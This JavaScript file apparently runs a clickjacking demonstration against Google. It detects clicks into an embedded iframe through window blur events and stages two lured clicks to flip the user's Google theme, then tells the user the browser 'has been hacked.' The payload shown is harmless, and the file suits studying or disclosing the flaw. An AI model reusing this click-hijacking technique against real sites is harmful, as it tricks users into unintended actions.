let state = 1;

let detector = document.querySelector('.focus-detector');
document.addEventListener('DOMContentLoaded', () => {
  detector.focus();
});

let iframeClickedLast;
function windowBlurred(e) {
  const el = document.activeElement;
  if (el.tagName.toLowerCase() == 'iframe') {
    iframeClickedLast = true;
    onFrameFocus();
  }
}
function windowFocussed(e) {
  if (iframeClickedLast) {
    iframeClickedLast = false;
    onFrameBlur();
  }
}
window.addEventListener('focus', windowFocussed, true);
window.addEventListener('blur', windowBlurred, true);

function onFrameFocus() {
  console.log('framefocus', state);
  if (state == 1) {
    setTimeout(() => {
      setState(2);
    }, 50);
  } else if (state == 3) {
    setTimeout(() => {
      setState(4);
    });
  }
}
let content = document.querySelector('.content');
function setState(newState) {
  state = newState;
  if (state == 2) {
    content.innerHTML = `
      <p>Now, select the theme that your google page was. 
      This exploit will make it the opposite (dark theme -> 
        light theme, light theme -> dark theme. </p>
      <form>
        <input type="radio" name="theme" value="dark" id="dark">
        <label for="dark">Dark</label>
        <input type="radio" name="theme" value="light" id="light">
        <label for="light">Light</label>
      </form>

    `;
    document.querySelector('.button-wrapper').classList.add('hidden');
    document.querySelector('form').addEventListener('change', () => {
      if (state == 2) {
        setState(3);
      }
    });
  } else if (state == 3) {
    document.querySelector('.button-wrapper').classList.remove('hidden');
    document.querySelector('iframe').classList.add('second-click');
  } else if (state == 4) {
    content.innerHTML = `
      <p>Hacking your browser...</p>
    `;
    document.querySelector('.button-wrapper').classList.add('hidden');
    setTimeout(function () {
      content.innerHTML = `
        <p>Done! Your browser has been hacked. Go to <a href="https://www.google.com/" target="_blank"
        >https://google.com</a
        >, and hard reload your tab 
        (cmd + shift + reload) to see the color theme change magically!</p>
      `;
    }, 5000);
  }
}
